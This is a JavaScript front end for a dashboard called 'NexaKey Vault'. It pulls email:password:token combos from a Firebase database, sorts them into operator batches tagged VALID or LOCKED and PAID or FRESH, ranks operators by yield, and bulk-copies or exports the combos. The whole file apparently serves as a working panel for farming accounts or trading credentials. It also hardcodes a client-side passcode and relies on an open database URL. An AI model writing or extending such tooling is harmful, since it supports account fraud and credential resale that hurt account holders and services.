// NexaKey Cloud Vault & Batch Engine
const VAULT_PASSCODE = 'nexakey123';
const FIREBASE_DB = 'https://nexakey-gen-default-rtdb.firebaseio.com';
const STORAGE_KEY_AUTH = 'nexakey_vault_auth';
const STORAGE_KEY_DB = 'nexakey_db_url';
const STORAGE_KEY_BATCH = 'nexakey_batch_status';
const STORAGE_KEY_CACHE = 'nexakey_local_cache';

let allAccounts = [];
let batchStatusMap = {}; // { [batchId]: 'PAID' | 'UNPAID' }
let activeTimeframe = 'today';
let leaderboardRange = 'today';
let activeFilter = 'ALL'; // ALL | FRESH | PAID
let currentOperator = 'ALL';
let searchQuery = '';
let autoRefreshTimer = null;

// Lock Elements
const lockOverlay = document.getElementById('lockOverlay');
const passInput = document.getElementById('passInput');
const lockError = document.getElementById('lockError');
const unlockBtn = document.getElementById('unlockBtn');
const lockForm = document.getElementById('lockForm');
const eyeToggle = document.getElementById('eyeToggle');
const mainApp = document.getElementById('mainApp');
const lockAppBtn = document.getElementById('lockAppBtn');

// DOM Elements
const boxesFeed = document.getElementById('boxesFeed');
const searchInput = document.getElementById('searchInput');
const operatorFilter = document.getElementById('operatorFilter');
const podiumRow = document.getElementById('podiumRow');
const leaderboardTbody = document.getElementById('leaderboardTbody');
const providerTagsList = document.getElementById('providerTagsList');

// Modal Elements
const userModal = document.getElementById('userModal');
const closeUserModal = document.getElementById('closeUserModal');
const configModal = document.getElementById('configModal');
const openConfigBtn = document.getElementById('openConfigBtn');
const closeConfigBtn = document.getElementById('closeConfigBtn');
const saveConfigBtn = document.getElementById('saveConfigBtn');
const clearCacheBtn = document.getElementById('clearCacheBtn');
const dbUrlInput = document.getElementById('dbUrlInput');

// Action Buttons
const refreshBtn = document.getElementById('refreshBtn');
const copyAllValidBtn = document.getElementById('copyAllValidBtn');
const copyAllLockedBtn = document.getElementById('copyAllLockedBtn');
const exportBtn = document.getElementById('exportBtn');
const exportCsvBtn = document.getElementById('exportCsvBtn');
const toast = document.getElementById('toast');
const liveStatusText = document.getElementById('liveStatusText');

// Initialization
document.addEventListener('DOMContentLoaded', () => {
    // Setup Lock Screen Handlers
    setupAuthHandlers();

    // Check if already authenticated
    const isAuth = localStorage.getItem(STORAGE_KEY_AUTH) === 'true';
    if (isAuth) {
        unlockVault();
    } else {
        showLockScreen();
    }
});

function setupAuthHandlers() {
    // Eye toggle for password visibility
    eyeToggle.addEventListener('click', () => {
        if (passInput.type === 'password') {
            passInput.type = 'text';
            eyeToggle.textContent = '🙈';
        } else {
            passInput.type = 'password';
            eyeToggle.textContent = '👁️';
        }
    });

    // Form submission
    lockForm.addEventListener('submit', (e) => {
        e.preventDefault();
        attemptUnlock();
    });

    unlockBtn.addEventListener('click', (e) => {
        e.preventDefault();
        attemptUnlock();
    });

    // Lock button in header
    lockAppBtn.addEventListener('click', () => {
        localStorage.removeItem(STORAGE_KEY_AUTH);
        if (autoRefreshTimer) clearInterval(autoRefreshTimer);
        showLockScreen();
        showToast('Vault locked!');
    });
}

function showLockScreen() {
    lockOverlay.classList.remove('hidden');
    mainApp.style.display = 'none';
    passInput.value = '';
    lockError.classList.remove('show');
    setTimeout(() => passInput.focus(), 100);
}

function attemptUnlock() {
    const entered = passInput.value.trim();
    if (entered === VAULT_PASSCODE) {
        localStorage.setItem(STORAGE_KEY_AUTH, 'true');
        lockError.classList.remove('show');
        unlockVault();
        showToast('⚡ Welcome to NexaKey Vault!');
    } else {
        lockError.classList.add('show');
        passInput.select();
    }
}

function unlockVault() {
    lockOverlay.classList.add('hidden');
    mainApp.style.display = 'block';

    const savedUrl = localStorage.getItem(STORAGE_KEY_DB) || FIREBASE_DB;
    dbUrlInput.value = savedUrl;
    localStorage.setItem(STORAGE_KEY_DB, savedUrl);

    // Load batch statuses
    try {
        batchStatusMap = JSON.parse(localStorage.getItem(STORAGE_KEY_BATCH) || '{}');
    } catch (e) {
        batchStatusMap = {};
    }

    // Load cache
    try {
        const cache = JSON.parse(localStorage.getItem(STORAGE_KEY_CACHE) || '[]');
        if (cache && cache.length > 0) {
            allAccounts = cache;
            render();
        }
    } catch (e) {}

    fetchAccounts();

    // Auto-refresh poll every 3.5 seconds
    if (autoRefreshTimer) clearInterval(autoRefreshTimer);
    autoRefreshTimer = setInterval(fetchAccounts, 3500);

    setupDashboardListeners();
}

function setupDashboardListeners() {
    // Timeframe selector
    document.querySelectorAll('#timeframeGroup .timeframe-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('#timeframeGroup .timeframe-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            activeTimeframe = btn.dataset.range;
            render();
        };
    });

    // Leaderboard timeframe pills
    document.querySelectorAll('.lb-pill').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('.lb-pill').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            leaderboardRange = btn.dataset.lbRange;
            renderLeaderboard();
        };
    });

    // Status filter tabs (All / Fresh / Paid)
    document.querySelectorAll('#statusFilterGroup .tab-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('#statusFilterGroup .tab-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            activeFilter = btn.dataset.filter;
            renderBoxes();
        };
    });

    // Operator filter
    operatorFilter.onchange = (e) => {
        currentOperator = e.target.value;
        renderBoxes();
    };

    // Search query
    searchInput.oninput = (e) => {
        searchQuery = e.target.value.toLowerCase().trim();
        renderBoxes();
    };

    // Refresh button
    refreshBtn.onclick = () => {
        showToast('Refreshing cloud data...');
        fetchAccounts();
    };

    // Copy all valid in active view
    copyAllValidBtn.onclick = () => {
        const boxes = getFilteredBoxes();
        const validAccs = [];
        boxes.forEach(b => {
            b.accounts.forEach(a => {
                if ((a.status || '').toUpperCase() === 'VALID') validAccs.push(a);
            });
        });

        if (validAccs.length === 0) {
            showToast('No valid accounts in current view!');
            return;
        }

        const text = validAccs.map(a => `${a.email}:${a.password}:${a.token}`).join('\n');
        navigator.clipboard.writeText(text).then(() => {
            showToast(`Copied ${validAccs.length} valid combo(s)!`);
        });
    };

    // Copy all locked in active view
    copyAllLockedBtn.onclick = () => {
        const boxes = getFilteredBoxes();
        const lockedAccs = [];
        boxes.forEach(b => {
            b.accounts.forEach(a => {
                if ((a.status || '').toUpperCase() === 'LOCKED') lockedAccs.push(a);
            });
        });

        if (lockedAccs.length === 0) {
            showToast('No locked accounts in current view!');
            return;
        }

        const text = lockedAccs.map(a => `${a.email}:${a.password}:${a.token}`).join('\n');
        navigator.clipboard.writeText(text).then(() => {
            showToast(`Copied ${lockedAccs.length} locked combo(s)!`);
        });
    };

    // Export TXT
    exportBtn.onclick = () => {
        const boxes = getFilteredBoxes();
        const accounts = [];
        boxes.forEach(b => accounts.push(...b.accounts));

        if (accounts.length === 0) {
            showToast('No accounts to export!');
            return;
        }

        let content = `# NexaKey Vault Export (${new Date().toLocaleString()})\n`;
        content += `# Timeframe: ${activeTimeframe} | Batches: ${boxes.length} | Accounts: ${accounts.length}\n\n`;
        boxes.forEach((b, idx) => {
            const status = batchStatusMap[b.id] === 'PAID' ? 'PAID' : 'UNPAID';
            content += `=== BATCH #${boxes.length - idx} [${status}] • Operator: ${b.operator} • ${b.startTime} ===\n`;
            b.accounts.forEach(a => {
                content += `[${a.status}] ${a.email}:${a.password}:${a.token} | Provider: ${a.provider || 'N/A'}\n`;
            });
            content += '\n';
        });

        downloadFile(content, `nexakey_export_${activeTimeframe}_${Date.now()}.txt`, 'text/plain');
        showToast('Exported to TXT!');
    };

    // Export CSV
    exportCsvBtn.onclick = () => {
        const boxes = getFilteredBoxes();
        const accounts = [];
        boxes.forEach(b => accounts.push(...b.accounts));

        if (accounts.length === 0) {
            showToast('No accounts to export!');
            return;
        }

        let csv = 'BatchID,BatchStatus,Operator,Email,Password,Token,Combo,AccountStatus,Provider,Timestamp\n';
        boxes.forEach(b => {
            const bStatus = batchStatusMap[b.id] === 'PAID' ? 'PAID' : 'UNPAID';
            b.accounts.forEach(a => {
                const combo = `${a.email}:${a.password}:${a.token}`;
                csv += `"${b.id}","${bStatus}","${a.operator || ''}","${a.email || ''}","${a.password || ''}","${a.token || ''}","${combo}","${a.status || ''}","${a.provider || ''}","${a.timestamp || ''}"\n`;
            });
        });

        downloadFile(csv, `nexakey_analytics_${activeTimeframe}_${Date.now()}.csv`, 'text/csv');
        showToast('Exported to CSV!');
    };

    // Modals
    closeUserModal.onclick = () => userModal.classList.remove('active');
    userModal.onclick = (e) => {
        if (e.target === userModal) userModal.classList.remove('active');
    };

    openConfigBtn.onclick = () => configModal.classList.add('active');
    closeConfigBtn.onclick = () => configModal.classList.remove('active');
    configModal.onclick = (e) => {
        if (e.target === configModal) configModal.classList.remove('active');
    };

    saveConfigBtn.onclick = () => {
        const url = dbUrlInput.value.trim().replace(/\/$/, '') || FIREBASE_DB;
        localStorage.setItem(STORAGE_KEY_DB, url);
        configModal.classList.remove('active');
        showToast('Database URL saved!');
        fetchAccounts();
    };

    clearCacheBtn.onclick = () => {
        localStorage.removeItem(STORAGE_KEY_CACHE);
        allAccounts = [];
        configModal.classList.remove('active');
        showToast('Cache cleared! Re-fetching...');
        fetchAccounts();
    };
}

// Fetch live accounts and cloud batch statuses
async function fetchAccounts() {
    const dbUrl = localStorage.getItem(STORAGE_KEY_DB) || FIREBASE_DB;
    try {
        let endpoint = dbUrl.endsWith('.json') ? dbUrl : `${dbUrl}/accounts.json`;
        const res = await fetch(endpoint);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);

        const data = await res.json();
        if (!data) {
            allAccounts = [];
        } else if (Array.isArray(data)) {
            allAccounts = data.filter(Boolean);
        } else if (typeof data === 'object') {
            allAccounts = Object.keys(data).map(key => ({
                id: key,
                ...data[key]
            }));
        }

        // Sort descending by timestamp (newest first)
        allAccounts.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
        localStorage.setItem(STORAGE_KEY_CACHE, JSON.stringify(allAccounts));

        // Fetch cloud batch status map
        try {
            const statusEndpoint = `${dbUrl.replace(/\/$/, '')}/batch_status.json`;
            const sRes = await fetch(statusEndpoint);
            if (sRes.ok) {
                const sData = await sRes.json();
                if (sData && typeof sData === 'object') {
                    Object.assign(batchStatusMap, sData);
                    localStorage.setItem(STORAGE_KEY_BATCH, JSON.stringify(batchStatusMap));
                }
            }
        } catch (e) {}

        liveStatusText.textContent = `Live Sync Active (${allAccounts.length} Total)`;
        render();
    } catch (e) {
        liveStatusText.textContent = 'Sync Offline';
    }
}

// Helper: Get or calculate batch ID for an account
function getBatchId(acc) {
    if (acc.session_id) return acc.session_id;
    const ts = new Date(acc.timestamp || 0).getTime();
    const cluster = Math.floor(ts / (5 * 60 * 1000));
    const op = (acc.operator || 'User').replace(/[^a-zA-Z0-9_]/g, '');
    return `batch_${op}_${cluster}`;
}

// Filter accounts by active timeframe
function getTimeframeAccounts(customRange) {
    const r = customRange || activeTimeframe;
    const now = new Date();
    const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
    const startOfYesterday = startOfToday - (24 * 60 * 60 * 1000);
    const sevenDaysAgo = now.getTime() - (7 * 24 * 60 * 60 * 1000);
    const thirtyDaysAgo = now.getTime() - (30 * 24 * 60 * 60 * 1000);

    return allAccounts.filter(acc => {
        if (!acc.timestamp) return true;
        const accTime = new Date(acc.timestamp).getTime();
        if (isNaN(accTime)) return true;

        if (r === 'today') {
            const accDate = new Date(acc.timestamp).toLocaleDateString();
            const todayDate = now.toLocaleDateString();
            return accDate === todayDate || accTime >= startOfToday || (now.getTime() - accTime <= 24 * 60 * 60 * 1000);
        } else if (r === 'yesterday') {
            return accTime >= startOfYesterday && accTime < startOfToday;
        } else if (r === '7d') {
            return accTime >= sevenDaysAgo;
        } else if (r === '30d') {
            return accTime >= thirtyDaysAgo;
        }
        return true; // 'all'
    });
}

// Group timeframe accounts into Batch Boxes
function getAllBatchBoxes() {
    const tfAccounts = getTimeframeAccounts();
    const map = {};

    tfAccounts.forEach(acc => {
        const bId = getBatchId(acc);
        if (!map[bId]) {
            map[bId] = {
                id: bId,
                operator: acc.operator || 'Operator1',
                provider: acc.provider || 'Draxono',
                startTime: acc.timestamp,
                status: batchStatusMap[bId] === 'PAID' ? 'PAID' : 'UNPAID',
                accounts: []
            };
        }
        map[bId].accounts.push(acc);
    });

    return Object.values(map).sort((a, b) => new Date(b.startTime || 0) - new Date(a.startTime || 0));
}

// Get batch boxes matching current filters and search
function getFilteredBoxes() {
    const allBoxes = getAllBatchBoxes();

    return allBoxes.filter(box => {
        const isPaid = batchStatusMap[box.id] === 'PAID';

        // Status filter (Fresh / Paid)
        if (activeFilter === 'FRESH' && isPaid) return false;
        if (activeFilter === 'PAID' && !isPaid) return false;

        // Operator filter
        if (currentOperator !== 'ALL' && box.operator !== currentOperator) return false;

        // Search query
        if (searchQuery) {
            const hasMatch = box.accounts.some(acc => {
                const haystack = `${acc.email || ''} ${acc.token || ''} ${acc.operator || ''} ${acc.provider || ''} ${box.id}`.toLowerCase();
                return haystack.includes(searchQuery);
            });
            if (!hasMatch) return false;
        }

        return true;
    });
}

// Full Render
function render() {
    renderStats();
    renderLeaderboard();
    renderOperatorDropdown();
    renderBoxes();
}

// Render Stats Cards
function renderStats() {
    const tfAccounts = getTimeframeAccounts();
    let total = tfAccounts.length;
    let valid = 0, locked = 0, invalid = 0, fresh = 0, paid = 0;

    tfAccounts.forEach(a => {
        const s = (a.status || '').toUpperCase();
        const bId = getBatchId(a);
        const isPaid = batchStatusMap[bId] === 'PAID';

        if (s === 'VALID') {
            valid++;
            if (!isPaid) fresh++;
            else paid++;
        } else if (s === 'LOCKED') {
            locked++;
        } else if (s === 'INVALID') {
            invalid++;
        }
    });

    const validPct = total > 0 ? Math.round((valid / total) * 100) : 0;

    document.getElementById('statTotal').textContent = total;
    document.getElementById('statValid').textContent = valid;
    document.getElementById('statValidRate').textContent = `${validPct}% Valid Rate`;
    document.getElementById('statLocked').textContent = locked;
    document.getElementById('statFresh').textContent = fresh;
    document.getElementById('statPaid').textContent = paid;

    // Filter counts
    const boxes = getAllBatchBoxes();
    let countFreshBoxes = 0, countPaidBoxes = 0;
    boxes.forEach(b => {
        if (batchStatusMap[b.id] === 'PAID') countPaidBoxes++;
        else countFreshBoxes++;
    });

    document.getElementById('countAll').textContent = boxes.length;
    document.getElementById('countFresh').textContent = countFreshBoxes;
    document.getElementById('countPaidBatches').textContent = countPaidBoxes;
    document.getElementById('batchesTotalBadge').textContent = `${boxes.length} Batches in Period`;
}

// 👑 Render Advanced Leaderboard (Podium + Table)
function renderLeaderboard() {
    const tfAccounts = getTimeframeAccounts(leaderboardRange);
    if (tfAccounts.length === 0) {
        podiumRow.innerHTML = '';
        leaderboardTbody.innerHTML = `<tr><td colspan="6" class="empty-mini">No operator activity recorded in this period.</td></tr>`;
        return;
    }

    const opMap = {};
    tfAccounts.forEach(acc => {
        const op = acc.operator || 'Operator1';
        if (!opMap[op]) {
            opMap[op] = { name: op, total: 0, valid: 0, locked: 0, invalid: 0 };
        }
        opMap[op].total++;
        const s = (acc.status || '').toUpperCase();
        if (s === 'VALID') opMap[op].valid++;
        else if (s === 'LOCKED') opMap[op].locked++;
        else if (s === 'INVALID') opMap[op].invalid++;
    });

    const rankedOps = Object.values(opMap).sort((a, b) => b.total - a.total);
    const podiumMedals = ['👑', '🥈', '🥉'];

    // 1. Render Top 3 Podium Cards
    const top3 = rankedOps.slice(0, 3);
    podiumRow.innerHTML = top3.map((op, idx) => {
        const initial = (op.name.charAt(0) || 'U').toUpperCase();
        const validRate = op.total > 0 ? Math.round((op.valid / op.total) * 100) : 0;
        return `
            <div class="podium-card rank-${idx + 1}" onclick="openUserModal('${escapeJs(op.name)}')">
                <div class="podium-crown">${podiumMedals[idx]} #${idx + 1}</div>
                <div class="podium-avatar">${initial}</div>
                <div class="podium-name">${escapeHtml(op.name)}</div>
                <div class="podium-val">🟢 ${op.valid} Valid (${validRate}%)</div>
            </div>
        `;
    }).join('');

    // 2. Render Full Leaderboard Table
    leaderboardTbody.innerHTML = rankedOps.map((op, idx) => {
        const initial = (op.name.charAt(0) || 'U').toUpperCase();
        const validRate = op.total > 0 ? Math.round((op.valid / op.total) * 100) : 0;
        const lockedRate = op.total > 0 ? Math.round((op.locked / op.total) * 100) : 0;
        const rankDisplay = idx === 0 ? '👑 #1' : idx === 1 ? '🥈 #2' : idx === 2 ? '🥉 #3' : `#${idx + 1}`;

        return `
            <tr class="leader-row-tr" onclick="openUserModal('${escapeJs(op.name)}')">
                <td class="tb-rank">${rankDisplay}</td>
                <td>
                    <div class="tb-op-cell">
                        <span class="tb-av">${initial}</span>
                        <span>${escapeHtml(op.name)}</span>
                    </div>
                </td>
                <td><strong>${op.total}</strong> accounts</td>
                <td><span class="text-green">🟢 ${op.valid} (${validRate}%)</span></td>
                <td><span class="text-yellow">🟡 ${op.locked}</span></td>
                <td>
                    <div class="ratio-bar-wrap" title="${validRate}% Valid, ${lockedRate}% Locked">
                        <div class="ratio-valid" style="width: ${validRate}%;"></div>
                        <div class="ratio-locked" style="width: ${lockedRate}%;"></div>
                    </div>
                </td>
            </tr>
        `;
    }).join('');
}

// Update Operator Filter Dropdown
function renderOperatorDropdown() {
    const ops = new Set(allAccounts.map(a => a.operator || 'Operator1'));
    const currentVal = operatorFilter.value;

    let html = '<option value="ALL">👤 All Operators</option>';
    ops.forEach(op => {
        html += `<option value="${escapeHtml(op)}"${op === currentVal ? ' selected' : ''}>👤 ${escapeHtml(op)}</option>`;
    });
    operatorFilter.innerHTML = html;
}

// Toggle Paid / Unpaid Status of a Batch Box
function toggleBatchStatus(batchId) {
    const current = batchStatusMap[batchId] === 'PAID' ? 'PAID' : 'UNPAID';
    const next = current === 'PAID' ? 'UNPAID' : 'PAID';

    if (next === 'PAID') {
        batchStatusMap[batchId] = 'PAID';
    } else {
        delete batchStatusMap[batchId];
    }
    localStorage.setItem(STORAGE_KEY_BATCH, JSON.stringify(batchStatusMap));

    // Persist to Firebase Realtime Database
    const dbUrl = localStorage.getItem(STORAGE_KEY_DB) || FIREBASE_DB;
    try {
        const endpoint = `${dbUrl.replace(/\/$/, '')}/batch_status/${batchId}.json`;
        fetch(endpoint, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(next === 'PAID' ? 'PAID' : null)
        }).catch(() => {});
    } catch (e) {}

    showToast(next === 'PAID' ? '🔴 Marked as PAID / USED' : '🟢 Marked as UNPAID / FRESH');
    render();
}

// Copy all valid combos from a single batch box
function copyBatchValid(batchId) {
    const box = getAllBatchBoxes().find(b => b.id === batchId);
    if (!box) return;

    const validAccs = box.accounts.filter(a => (a.status || '').toUpperCase() === 'VALID');
    if (validAccs.length === 0) {
        showToast('No valid accounts in this batch box!');
        return;
    }

    const text = validAccs.map(a => `${a.email}:${a.password}:${a.token}`).join('\n');
    navigator.clipboard.writeText(text).then(() => {
        showToast(`Copied ${validAccs.length} valid combo(s) from ${box.operator}'s batch!`);
    });
}

// Copy all locked combos from a single batch box
function copyBatchLocked(batchId) {
    const box = getAllBatchBoxes().find(b => b.id === batchId);
    if (!box) return;

    const lockedAccs = box.accounts.filter(a => (a.status || '').toUpperCase() === 'LOCKED');
    if (lockedAccs.length === 0) {
        showToast('No locked accounts in this batch box!');
        return;
    }

    const text = lockedAccs.map(a => `${a.email}:${a.password}:${a.token}`).join('\n');
    navigator.clipboard.writeText(text).then(() => {
        showToast(`Copied ${lockedAccs.length} locked combo(s) from ${box.operator}'s batch!`);
    });
}

// 📦 RENDER BATCH BOXES FEED
function renderBoxes() {
    const filteredBoxes = getFilteredBoxes();

    if (filteredBoxes.length === 0) {
        boxesFeed.innerHTML = `
            <div class="empty-state">
                <div style="font-size: 36px; margin-bottom: 12px;">📭</div>
                <p>No batch boxes found matching your timeframe and filters.</p>
                <small style="color: var(--text-muted);">When accounts are generated, all accounts from each run group into a dedicated Box here.</small>
            </div>
        `;
        return;
    }

    boxesFeed.innerHTML = filteredBoxes.map((box, idx) => {
        const isPaid = batchStatusMap[box.id] === 'PAID';
        const boxClass = isPaid ? 'box-paid' : 'box-unpaid';
        const btnClass = isPaid ? 'btn-paid' : 'btn-unpaid';
        const btnText = isPaid ? '🔴 PAID / USED' : '🟢 UNPAID / FRESH';

        const validCount = box.accounts.filter(a => (a.status || '').toUpperCase() === 'VALID').length;
        const lockedCount = box.accounts.filter(a => (a.status || '').toUpperCase() === 'LOCKED').length;
        const invalidCount = box.accounts.filter(a => (a.status || '').toUpperCase() === 'INVALID').length;

        const tsFormatted = box.startTime ? new Date(box.startTime).toLocaleString([], {
            month: 'short',
            day: 'numeric',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        }) : 'Recent';

        const accountsHtml = box.accounts.map(acc => {
            const status = (acc.status || 'VALID').toUpperCase();
            const email = acc.email || 'N/A';
            const pass = acc.password || '';
            const token = acc.token || '';
            const combo = `${email}:${pass}:${token}`;

            return `
                <div class="account-row">
                    <div class="account-row-left">
                        <span class="badge-status ${status}">${status}</span>
                        <span class="combo-text">${escapeHtml(combo)}</span>
                    </div>
                    <div class="account-row-right">
                        <button class="sm-copy-btn" onclick="copyText('${escapeJs(combo)}', 'Combo copied!')">📋 Copy</button>
                        <button class="sm-copy-btn" onclick="copyText('${escapeJs(token)}', 'Token copied!')">🎫 Token</button>
                    </div>
                </div>
            `;
        }).join('');

        return `
            <div class="batch-box ${boxClass}">
                <div class="batch-header">
                    <div class="batch-header-left">
                        <span class="batch-badge">📦 Batch #${filteredBoxes.length - idx}</span>
                        <span class="operator-tag" onclick="openUserModal('${escapeJs(box.operator)}')">
                            👤 <strong>${escapeHtml(box.operator)}</strong>
                        </span>
                        <span class="batch-meta-time">🕒 ${tsFormatted}</span>
                        <div class="batch-status-counts">
                            <span class="text-green">🟢 ${validCount} Valid</span>
                            ${lockedCount > 0 ? `<span class="text-yellow">🟡 ${lockedCount} Locked</span>` : ''}
                            ${invalidCount > 0 ? `<span class="text-red">🔴 ${invalidCount} Invalid</span>` : ''}
                        </div>
                    </div>
                    <div class="batch-header-right">
                        <button class="status-btn ${btnClass}" onclick="toggleBatchStatus('${escapeJs(box.id)}')">${btnText}</button>
                        <button class="btn-copy-box" onclick="copyBatchValid('${escapeJs(box.id)}')">📋 Copy Valid (${validCount})</button>
                        ${lockedCount > 0 ? `<button class="btn-copy-locked" onclick="copyBatchLocked('${escapeJs(box.id)}')">🟡 Copy Locked (${lockedCount})</button>` : ''}
                    </div>
                </div>
                <div class="batch-accounts">
                    ${accountsHtml}
                </div>
            </div>
        `;
    }).join('');
}

// 👤 OPEN OPERATOR PROFILE & STATS MODAL
function openUserModal(operatorName) {
    const op = operatorName || 'Operator1';
    document.getElementById('modalUserName').textContent = `Operator: ${op}`;
    document.getElementById('modalUserAvatar').textContent = (op.charAt(0) || 'U').toUpperCase();

    // Compute stats for this user
    const now = new Date();
    const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();

    let uTodayTotal = 0, uTodayValid = 0, uTodayLocked = 0;
    let uAllTotal = 0, uAllValid = 0, uAllFresh = 0, uAllPaid = 0;

    const allBoxes = getAllBatchBoxes();

    allAccounts.forEach(acc => {
        if ((acc.operator || 'Operator1') === op) {
            uAllTotal++;
            const s = (acc.status || '').toUpperCase();
            const bId = getBatchId(acc);
            const isPaid = batchStatusMap[bId] === 'PAID';

            if (s === 'VALID') {
                uAllValid++;
                if (!isPaid) uAllFresh++;
                else uAllPaid++;
            }

            const accTime = new Date(acc.timestamp || 0).getTime();
            if (accTime >= startOfToday) {
                uTodayTotal++;
                if (s === 'VALID') uTodayValid++;
                else if (s === 'LOCKED') uTodayLocked++;
            }
        }
    });

    const uTodayRate = uTodayTotal > 0 ? Math.round((uTodayValid / uTodayTotal) * 100) : 0;

    document.getElementById('uTodayTotal').textContent = uTodayTotal;
    document.getElementById('uTodayValid').textContent = uTodayValid;
    document.getElementById('uTodayLocked').textContent = uTodayLocked;
    document.getElementById('uTodayRate').textContent = `${uTodayRate}%`;

    document.getElementById('uAllTotal').textContent = uAllTotal;
    document.getElementById('uAllValid').textContent = uAllValid;
    document.getElementById('uAllFresh').textContent = uAllFresh;
    document.getElementById('uAllPaid').textContent = uAllPaid;

    // Render batches list for this user
    const opBoxes = allBoxes.filter(b => b.operator === op);
    if (opBoxes.length === 0) {
        document.getElementById('modalUserBatches').innerHTML = `<div class="empty-mini">No batches recorded for this user.</div>`;
    } else {
        document.getElementById('modalUserBatches').innerHTML = opBoxes.map((b, i) => {
            const isPaid = batchStatusMap[b.id] === 'PAID';
            const validCount = b.accounts.filter(a => (a.status || '').toUpperCase() === 'VALID').length;
            const tsFormatted = b.startTime ? new Date(b.startTime).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', month: 'short', day: 'numeric' }) : 'Recent';

            return `
                <div class="user-batch-row ${isPaid ? 'is-paid' : 'is-unpaid'}">
                    <div>
                        <strong>Batch #${opBoxes.length - i}</strong> &bull; ${tsFormatted} &bull; <span class="text-green">🟢 ${validCount} Valid</span>
                    </div>
                    <div>
                        <button class="sm-copy-btn" onclick="toggleBatchStatus('${escapeJs(b.id)}'); openUserModal('${escapeJs(op)}');">
                            ${isPaid ? '🔴 PAID' : '🟢 FRESH'}
                        </button>
                        <button class="sm-copy-btn" onclick="copyBatchValid('${escapeJs(b.id)}')">📋 Copy</button>
                    </div>
                </div>
            `;
        }).join('');
    }

    userModal.classList.add('active');
}

function copyText(text, msg = 'Copied to clipboard!') {
    navigator.clipboard.writeText(text).then(() => showToast(msg));
}

function downloadFile(content, fileName, mimeType) {
    const blob = new Blob([content], { type: `${mimeType};charset=utf-8` });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = fileName;
    a.click();
    URL.revokeObjectURL(url);
}

function showToast(msg) {
    toast.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2200);
}

function escapeHtml(str) {
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function escapeJs(str) {
    return String(str).replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
}
